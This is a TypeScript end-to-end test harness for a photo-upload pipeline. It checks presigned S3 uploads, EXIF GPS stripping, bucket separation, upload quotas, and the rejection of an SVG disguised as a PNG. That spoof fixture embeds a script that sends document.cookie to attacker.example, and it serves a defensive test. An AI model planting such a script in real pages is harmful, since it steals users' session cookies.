/* The contribution lifecycle, end to end, against a real S3 implementation.
 *
 * Driven by scripts/lifecycle.sh, which owns the environment contract. Run it, not this.
 *
 * ── What this exists to catch ────────────────────────────────
 *
 * Every piece of the write path has unit tests and none of them touch the piece next to
 * it. request-upload's tests never mint a URL; the worker's tests never receive one;
 * exif-gate runs the pipeline against a directory. The seams between them — a presigned
 * URL an S3 server will actually accept, a job the worker will actually verify, a
 * derivative that actually lands in the bucket the database was told about — are checked
 * by nothing, and every one of them fails silently.
 *
 * Concretely, this is the only thing in the repository that executes
 * `endpoint: r2Endpoint()` at either call site. Comment out both and every one of the 190
 * unit tests still passes; this run cannot even start.
 *
 * ── WHAT A GREEN RUN HERE DOES NOT PROVE ─────────────────────
 *
 * Said plainly and at the top, because a harness that is trusted for more than it checks
 * is worse than no harness:
 *
 *  1. NOT §11 gate 2. That gate says "verified on a real photo carrying GPS data, end to
 *     end", and end to end means the deployed system: a browser PUT to a real R2 bucket,
 *     the container on Cloud Run, the object fetched back through the CDN. This is MinIO
 *     on localhost. The EXIF checks below are the same assertions against a different
 *     storage backend, which is worth having and is not the gate.
 *
 *  2. NOT M1's exit criterion, for the same reason. "A 4K master survives intact in
 *     originals/ while only renditions are CDN-reachable" needs real R2 and a deployed
 *     worker. Neither exists here.
 *
 *  3. "No originals/ object reachable through the public path" is a BUCKET-POLICY PROXY,
 *     not the real assertion. MinIO has no CDN in front of it. What is actually checked is
 *     that the manifest the database accepted names `public` for derivatives and
 *     `originals` for the master — which is a claim about our code, not about whether a
 *     CDN would serve the bytes. The real assertion needs an R2 bucket binding and a
 *     Cloudflare route, and it cannot be made from a laptop or from CI.
 *
 *  4. NOT the CDN, cache headers, TTLs, or anything about `manifest.json`. Different path,
 *     different tests.
 *
 *  5. NOT Cloud Run's behaviour — concurrency, scale-to-zero, the post-202 background
 *     work, or the request timeout. The worker here is a container on a docker network
 *     answering one request at a time.
 *
 * Nothing in this file may be recorded as a launch gate met.
 */

import { R2Store } from "../../worker/src/store.ts";
import { buildExifApp1, gpsWireBytes, indexOfBytes, injectExif, RAMALLAH, readGps } from "../../worker/scripts/lib/exif.ts";
import { Checks } from "../../worker/scripts/lib/harness.ts";

/* ── The environment contract ───────────────────────────────── */

function env(name: string, fallback?: string): string {
  const v = Deno.env.get(name) ?? fallback;
  if (!v) throw new Error(`missing required environment variable: ${name}`);
  return v;
}

const SUPABASE_URL = env("SUPABASE_URL", "http://127.0.0.1:54321");
const ANON_KEY = env("SUPABASE_ANON_KEY");
const SERVICE_KEY = env("SUPABASE_SERVICE_ROLE_KEY");
const MINIO_ENDPOINT = env("R2_ENDPOINT", "http://127.0.0.1:9000");
const R2_ACCOUNT_ID = env("R2_ACCOUNT_ID", "lifecycle");
const R2_ACCESS_KEY_ID = env("R2_ACCESS_KEY_ID");
const R2_SECRET_ACCESS_KEY = env("R2_SECRET_ACCESS_KEY");

const checks = new Checks();

/**
 * How many assertions actually executed.
 *
 * Checks only records FAILURES, so a run that exits early with nothing wrong is
 * indistinguishable from a run that verified everything — both report zero failures. That
 * is not hypothetical here: the first green lifecycle run took 5 seconds where a previous
 * run took 365, and there was no way to tell "fast because it worked" from "fast because
 * it stopped". (The 365s turned out to be the FAILURE mode — settle() polling out twice —
 * so the fast run was probably right, and "probably" is the problem.)
 *
 * The floor is asserted in CI, the same argument the database job's harness probe makes:
 * a suite that can silently shrink is a suite whose green means nothing.
 */
let executed = 0;
function ck(cond: boolean, msg: string): void {
  executed++;
  checks.check(cond, msg);
}

const minio = new URL(MINIO_ENDPOINT);
const store = new R2Store({
  accountId: R2_ACCOUNT_ID,
  accessKeyId: R2_ACCESS_KEY_ID,
  secretAccessKey: R2_SECRET_ACCESS_KEY,
  endpoint: { host: minio.host, protocol: minio.protocol === "http:" ? "http:" : "https:" },
});

/* ── Talking to the stack ───────────────────────────────────── */

/** Cloudflare's always-pass test secret is configured; any token satisfies it. */
const TURNSTILE_TOKEN = "lifecycle-harness";

async function signUp(email: string): Promise<{ jwt: string; sub: string }> {
  const res = await fetch(`${SUPABASE_URL}/auth/v1/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json", apikey: ANON_KEY },
    body: JSON.stringify({ email, password: "lifecycle-harness-password-1" }),
  });
  if (!res.ok) throw new Error(`signup failed ${res.status}: ${await res.text()}`);
  const out = await res.json();
  const jwt = out.access_token;
  if (!jwt) throw new Error(`signup returned no session — is email confirmation on? ${JSON.stringify(out)}`);
  return { jwt, sub: out.user.id };
}

function draft(title: string) {
  return {
    title_en: title,
    body_en: "archival description written by the lifecycle harness",
    license: "CC-BY-SA-4.0",
    provenance: "generated fixture, no provenance claim",
    consent: { granted: true },
  };
}

async function requestUpload(
  jwt: string,
  body: Record<string, unknown>,
): Promise<{ status: number; json: Record<string, unknown> }> {
  const res = await fetch(`${SUPABASE_URL}/functions/v1/request-upload`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
    },
    body: JSON.stringify({ turnstile_token: TURNSTILE_TOKEN, kind: "media", ...body }),
  });
  return { status: res.status, json: await res.json() };
}

async function completeUpload(jwt: string, objectKey: string): Promise<{ status: number; json: Record<string, unknown> }> {
  const res = await fetch(`${SUPABASE_URL}/functions/v1/complete-upload`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
    },
    body: JSON.stringify({ object_key: objectKey }),
  });
  return { status: res.status, json: await res.json() };
}

/** The posts row, read as service_role — the harness is allowed to look behind RLS. */
async function postRow(postId: string): Promise<Record<string, unknown> | null> {
  const res = await fetch(
    `${SUPABASE_URL}/rest/v1/posts?id=eq.${postId}&select=ingest_state,ingest_error,ingest_attempts`,
    { headers: { apikey: SERVICE_KEY, Authorization: `Bearer ${SERVICE_KEY}` } },
  );
  if (!res.ok) return null;
  const rows = await res.json();
  return rows[0] ?? null;
}

async function mediaAssets(postId: string): Promise<Array<Record<string, unknown>>> {
  const res = await fetch(
    `${SUPABASE_URL}/rest/v1/media_assets?post_id=eq.${postId}&select=role,rendition,bucket,storage_path`,
    { headers: { apikey: SERVICE_KEY, Authorization: `Bearer ${SERVICE_KEY}` } },
  );
  return res.ok ? await res.json() : [];
}

/** Waits for the worker to finish. Bounded — a hang must fail, not stall the run. */
async function settle(postId: string, seconds = 180): Promise<Record<string, unknown> | null> {
  for (let i = 0; i < seconds; i++) {
    const row = await postRow(postId);
    if (row && row.ingest_state !== "processing" && row.ingest_state !== "awaiting_bytes") return row;
    await new Promise((r) => setTimeout(r, 1000));
  }
  return await postRow(postId);
}

/* ── The fixtures ───────────────────────────────────────────── */

/** The caption the APP1 carries, so a leak is greppable rather than merely absent. */
const GPS_CAPTION = "LIFECYCLE-SENSITIVE-CAPTION-DO-NOT-PUBLISH";

/** A real JPEG carrying real GPS rationals for Ramallah. Same builder exif-gate.ts uses. */
async function gpsJpeg(): Promise<Uint8Array> {
  const bare = await ffmpegBytes([
    "-f", "lavfi", "-i", "testsrc=size=800x600:duration=1:rate=1",
    "-frames:v", "1", "-f", "mjpeg", "-",
  ]);
  return injectExif(bare, buildExifApp1(RAMALLAH, GPS_CAPTION));
}

/** An SVG that lies about being a PNG. §6 names SVG specifically; the worker sniffs. */
function spoofedSvg(): Uint8Array {
  return new TextEncoder().encode(
    `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
      `<script>fetch("https://attacker.example/"+document.cookie)</script></svg>`,
  );
}

/**
 * fetch that reports a transport failure instead of throwing.
 *
 * This exists because of a specific missed diagnosis. Branch
 * verify/lifecycle-discriminates removed `endpoint: r2Endpoint()` to prove check 1 catches
 * it. The run went red — and produced NO check output at all, because the PUT then went to
 * a Cloudflare host that does not exist, fetch threw, and the process died before
 * checks.report() could say which assertion had failed. A red on no check in particular
 * proves nothing, so that run could not settle the question it was launched to settle.
 *
 * Every network call the harness makes to an address under test goes through here. A dead
 * host becomes a named failing check, which is the whole point of having checks.
 */
async function tryFetch(
  url: string,
  init: RequestInit,
): Promise<{ ok: boolean; status: number; detail: string }> {
  try {
    const res = await fetch(url, init);
    return { ok: res.ok, status: res.status, detail: res.ok ? "" : await res.text() };
  } catch (e) {
    return { ok: false, status: 0, detail: `transport failure reaching ${url}: ${e}` };
  }
}

async function ffmpegBytes(args: string[]): Promise<Uint8Array> {
  const cmd = new Deno.Command("ffmpeg", {
    args: ["-loglevel", "error", "-nostdin", ...args],
    stdout: "piped",
    stderr: "piped",
    stdin: "null",
  });
  const { code, stdout, stderr } = await cmd.output();
  if (code !== 0) throw new Error(`ffmpeg failed: ${new TextDecoder().decode(stderr)}`);
  return stdout;
}

/* ── The run ────────────────────────────────────────────────── */

console.log("# lifecycle — request-upload → MinIO → complete-upload → worker\n");

const stamp = crypto.randomUUID().slice(0, 8);
const member = await signUp(`lifecycle-${stamp}@harness.local`);
console.log(`member ${member.sub}`);

/* ── 1 · The seam. The whole reason R2_ENDPOINT exists. ─────── */

const photo = await gpsJpeg();
const first = await requestUpload(member.jwt, {
  mime: "image/jpeg",
  bytes: photo.byteLength,
  draft: draft("gps fixture"),
});

ck(first.status === 200, `request-upload refused a valid request: ${first.status} ${JSON.stringify(first.json)}`);

const upload = first.json.upload as { url: string; headers: Record<string, string>; method: string } | undefined;
ck(upload !== undefined, "request-upload returned no upload block");

if (upload) {
  const signedHost = new URL(upload.url).host;
  // THE assertion nothing else in the repository makes. If request-upload ignored
  // R2_ENDPOINT this is `<account>.r2.cloudflarestorage.com` and everything below fails
  // in a way that looks like a network problem. Named here so it does not.
  ck(
    signedHost === minio.host,
    `the presigned URL points at ${signedHost}, not ${minio.host} — request-upload ignored R2_ENDPOINT`,
  );
}

/* ── 2 · An S3 server accepts what we signed ────────────────── */

const objectKey = String(first.json.object_key ?? "");
const postId = String(first.json.post_id ?? "");

if (upload) {
  const put = await tryFetch(upload.url, {
    method: upload.method,
    headers: upload.headers,
    body: photo as unknown as BodyInit,
  });
  // MinIO recomputes the signature from the request it receives, including the
  // content-length binding §6's quota depends on. A 403 here is a canonicalisation bug,
  // not a credentials problem — sigv4.ts's header says exactly this.
  //
  // status 0 means the host did not answer at all, which is what a URL signed for
  // Cloudflare looks like from a runner with no R2 account. Reported as a failed check
  // rather than an exception, so check 1 above stays the one that names the cause.
  ck(put.ok, `the presigned PUT did not succeed: ${put.status} ${put.detail}`);
}

/* ── 3 · complete-upload → the worker → the buckets ─────────── */

const done = await completeUpload(member.jwt, objectKey);
ck(done.status === 200 || done.status === 202, `complete-upload failed: ${done.status} ${JSON.stringify(done.json)}`);

const settled = await settle(postId);
ck(
  settled?.ingest_state === "ready",
  `ingest did not reach 'ready': ${JSON.stringify(settled)}`,
);

const assets = await mediaAssets(postId);
const master = assets.find((a) => a.role === "master");
const derivatives = assets.filter((a) => a.role !== "master");

ck(master !== undefined, "no master row — the preservation copy was never recorded");
ck(derivatives.length > 0, "no derivative rows — nothing was produced for the public bucket");

// The bucket split, §6. NOTE: this is the PROXY described at the top of this file — it
// asserts what our code recorded, not what a CDN would serve. MinIO has no CDN.
ck(master?.bucket === "originals", `the master landed in ${master?.bucket}, not originals`);
ck(
  derivatives.every((d) => d.bucket === "public"),
  `a derivative landed outside public/: ${JSON.stringify(derivatives.map((d) => d.bucket))}`,
);

/* ── 4 · §11 gate 2's assertions, against MinIO ─────────────── */

if (master) {
  const kept = await store.head("originals", String(master.storage_path), 65536);
  const gps = readGps(kept);
  // BOTH directions. A pipeline that stripped everything everywhere would pass a naive
  // "no EXIF anywhere" check while destroying the preservation copy §6 exists to keep.
  ck(
    gps !== null,
    "the archival master lost its GPS — originals/ is supposed to be untouched",
  );
}

for (const d of derivatives) {
  const bytes = await store.head("public", String(d.storage_path), 65536);
  ck(
    readGps(bytes) === null,
    `a public derivative still carries GPS: ${d.storage_path}`,
  );
  ck(
    indexOfBytes(bytes, gpsWireBytes(RAMALLAH.latitude)) === -1,
    `a public derivative carries the latitude rational verbatim: ${d.storage_path}`,
  );
}

/* ── 5 · A spoofed PNG is refused at the WORKER, not earlier ── */

// The declared type passes request-upload's allowlist — that is the point. §6 says
// "validate by magic bytes, not extension", and this is the request that finds out whether
// anything actually does. The refusal has to come from the worker's sniffer.
const svg = spoofedSvg();
const spoof = await requestUpload(member.jwt, {
  mime: "image/png",
  bytes: svg.byteLength,
  draft: draft("spoofed png"),
});
ck(spoof.status === 200, `request-upload refused the declared PNG early: ${spoof.status}`);

const spoofUpload = spoof.json.upload as { url: string; headers: Record<string, string>; method: string } | undefined;
const spoofKey = String(spoof.json.object_key ?? "");
const spoofPost = String(spoof.json.post_id ?? "");

if (spoofUpload) {
  const spoofPut = await tryFetch(spoofUpload.url, {
    method: spoofUpload.method,
    headers: spoofUpload.headers,
    body: svg as unknown as BodyInit,
  });
  ck(spoofPut.ok, `the spoofed-PNG PUT did not succeed: ${spoofPut.status} ${spoofPut.detail}`);
  await completeUpload(member.jwt, spoofKey);
  const row = await settle(spoofPost);
  ck(
    row?.ingest_state === "failed",
    `an SVG declared image/png was not refused: ${JSON.stringify(row)}`,
  );
  ck(
    (await mediaAssets(spoofPost)).length === 0,
    "the spoofed SVG produced media_assets rows — bytes reached the public bucket",
  );
}

/* ── 6 · Quota exhaustion refuses BEFORE a URL is minted ────── */

// The §6 cost ceiling is "enforced in the database", and the thing that makes it a ceiling
// rather than a speed bump is WHERE it refuses. A signed URL handed out and then regretted
// is a signed URL that still works for five minutes.
const quotaMember = await signUp(`lifecycle-quota-${stamp}@harness.local`);

// Exhaust the member's daily count. public.upload_daily_limits() gives a member 20.
let exhausted: { status: number; json: Record<string, unknown> } | null = null;
for (let i = 0; i < 22; i++) {
  const r = await requestUpload(quotaMember.jwt, {
    mime: "image/jpeg",
    bytes: 1024,
    draft: draft(`quota probe ${i}`),
  });
  if (r.status === 429) {
    exhausted = r;
    break;
  }
}

ck(exhausted !== null, "the daily upload count never refused — the quota is not a ceiling");
if (exhausted) {
  ck(
    exhausted.json.error === "quota_exceeded",
    `refused, but not as a quota: ${JSON.stringify(exhausted.json)}`,
  );
  // THE assertion. Not "it was refused" — "it was refused before anything was signed".
  ck(
    exhausted.json.upload === undefined,
    "a URL was minted for a request over quota — the refusal is after the signing, not before it",
  );
}

// Printed BEFORE report(), which exits. CI gates on this number: a run that stops early
// has zero failures and looks identical to a run that verified everything, which is the
// hole a count closes. 20 sites, two of them inside the per-derivative loop, so the real
// figure is 18 plus twice the derivative count.
console.log(`\nLIFECYCLE checks=${executed} failures=${checks.failures.length}`);

checks.report(
  "lifecycle: all checks passed.\n" +
    "NOT a gate met. MinIO is not R2, localhost is not Cloud Run, and there is no CDN in\n" +
    "this run — see the header for the five things a green result here does not prove.",
);
